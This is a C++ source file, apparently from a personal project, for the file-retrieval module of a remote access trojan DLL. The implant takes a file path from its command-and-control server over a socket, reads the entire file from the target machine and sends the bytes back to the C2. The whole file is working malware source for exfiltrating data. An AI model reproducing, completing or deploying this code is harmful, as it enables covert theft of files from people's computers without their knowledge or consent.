// Patrick Sacchet (@pjsacchet)
// Verison 1.0.
// RAT-Dll-GetFile.cpp : Defines functionality for performing a file get on target, i.e., retrieving a buffer of file contents and sending it back to our C2 server

#include "RAT-Dll-Connect.h"
#include "RAT-Dll-GetFile.h"

/*TODO: Add ability to start at offset within file
		Add ability to chunk data we send back
		Check file size output parameter bytes*/


/** Handle socket work and function calls for performing get file functionality 
params:
* clientSock - current open client socket to implant 
return:
* if successful we return SUCCESS; otherwise print error code and handle appropiately
*/
INT handleGetFile(SOCKET clientSock)
{
	INT status = SUCCESS, recvBufLen = DEFAULT_BUF_LEN;
    CHAR recvBuf[DEFAULT_BUF_LEN], msgBuf[DEFAULT_BUF_LEN];

    // Receive our file path 
    status = recv(clientSock, recvBuf, recvBufLen, 0);
    if (status != SOCKET_ERROR) // TODO: change this to match conditional like above; check for failure and fail out otherwise continue 
    {
        sprintf_s(msgBuf, "RAT-Dll-GetFile::handleGetFile - Performing get file on %s...\n", recvBuf);
        OutputDebugStringA(msgBuf);

        char** fileBytes = (char**)malloc(sizeof(char*));
        if (fileBytes == NULL)
        {
            OutputDebugStringA("RAT-Dll-GetFile::handleGetFile - Failed to allocate space for fileBytes buffer! \n");
            status = FAILURE;
            goto cleanup;
        }

        DWORD bufferSize = 0;

        status = performGetFile((const char*)&recvBuf, fileBytes, &bufferSize);
        if (status != SUCCESS)
        {
            // Send back failure here as well 
            sprintf_s(msgBuf, "RAT-Dll-GetFile::handleGetFile - Failure recevied from performGetFile %d\n", status);
            OutputDebugStringA(msgBuf);
            goto cleanup;
        }

        sprintf_s(msgBuf, "RAT-Dll-GetFile::handleGetFile - Read %d bytes from file\n", bufferSize);
        OutputDebugStringA(msgBuf);

        OutputDebugStringA("RAT-Dll-GetFile::handleGtFile - Sending status SUCCESS back to C2...\n");

        // Change this to code constants later... bit dumb to have string here but whatever 
        status = send(clientSock, "SUCCESS", 7, 0);
        if (status == SOCKET_ERROR)
        {
            sprintf_s(msgBuf, "RAT-Dll-GetFile::handleGetFile - Failure recevied from send (status code) %d\n", WSAGetLastError());
            OutputDebugStringA(msgBuf);
            status = WSAGetLastError();
            goto cleanup;
        }

        OutputDebugStringA("RAT-Dll-GetFile::handleGetFile - Sending buffer back to C2...\n");

        status = send(clientSock, *fileBytes, bufferSize, 0);
        if (status == SOCKET_ERROR)
        {
            sprintf_s(msgBuf, "RAT-Dll-GetFile::handleGetFile - Failure recevied from send (file bytes) %d\n", WSAGetLastError());
            OutputDebugStringA(msgBuf);
            status = WSAGetLastError();
            goto cleanup;
        }

        // Free the buffer we point to then free the memory we allocated for the pointer
        free(*fileBytes);
        free(fileBytes);
    }

    // Failed to get our file path...
    else
    {
        OutputDebugStringA("RAT-Dll-GetFile::handleGetFile - Failure received from recv (file path)\n");
        status = FAILURE;
        goto cleanup;
    }


cleanup:
    return status;
}


/** This function will perform a simple get file for us 
params:
* filePath - path to the file we're getting
* fileBytes - pointer to buffer containing file bytes we got from our target file 
* bufferSize - size of the output file buffer 
return:
* if successful we return SUCCESS; otherwise print error code and handle appropiately 
*/
INT performGetFile(__in const char* filePath, __out char** fileBytes, __out DWORD* bufferSize)
{
	INT status = SUCCESS;
	HANDLE hFile;
	DWORD dwBytesRead = 0;
	CHAR msgBuf[DEFAULT_BUF_LEN], *fileContents = NULL;
	LARGE_INTEGER fileSize; 

	hFile = CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		OutputDebugStringA("RAT-Dll-GetFile::performGetFile - Failure from CreateFileA (INVALID_HANDLE_VALUE)");
		status = FAILURE;
		goto cleanup;
	}

	// Get file details first prior to reading it so we can get the whole size of the file 
	if (!GetFileSizeEx(hFile, &fileSize))
	{
		sprintf_s(msgBuf, "RAT-Dll-GetFile::performGetFile - Failure from GetFileSizeEx %d\n", GetLastError());
		OutputDebugStringA(msgBuf);
		status = GetLastError();
		goto cleanup;
	}

	// Allocate for our file buffer
	 fileContents = (char*)malloc(fileSize.QuadPart * sizeof(char));
	if (fileContents == NULL)
	{
		OutputDebugStringA("RAT-Dll-GetFile::performGetFile - Failure from malloc (NOT ENOUGH MEMORY)");
		status = FAILURE;
		goto cleanup;
	}

	// These data sizes dont technically match up so fix this later...
	*bufferSize = fileSize.QuadPart;

	sprintf_s(msgBuf, "RAT-Dll-GetFile::performGetFile - Size of buffer we're grabbing: %d\n", *bufferSize);
	OutputDebugStringA(msgBuf);

	// Now note the size and read the file 
	if (!ReadFile(hFile, fileContents, fileSize.QuadPart, &dwBytesRead, NULL))
	{
		sprintf_s(msgBuf, "RAT-Dll-GetFile::performGetFile - Failure from ReadFile %d\n", GetLastError());
		OutputDebugStringA(msgBuf);
		status = GetLastError();
		goto cleanup;
	}
	
	*fileBytes = fileContents;

	// Normal Windows app will close the handle to the file
	if (!CloseHandle(hFile))
	{
		printf_s(msgBuf, "RAT-Dll-GetFile::performGetFile - Failure from CloseHandle %d\n", GetLastError());
		OutputDebugStringA(msgBuf);
		status = GetLastError();
		goto cleanup;
	}

	OutputDebugStringA("RAT-Dll-GetFile::performGetFile - Successfully got file from target! \n");

cleanup:
	return status;
}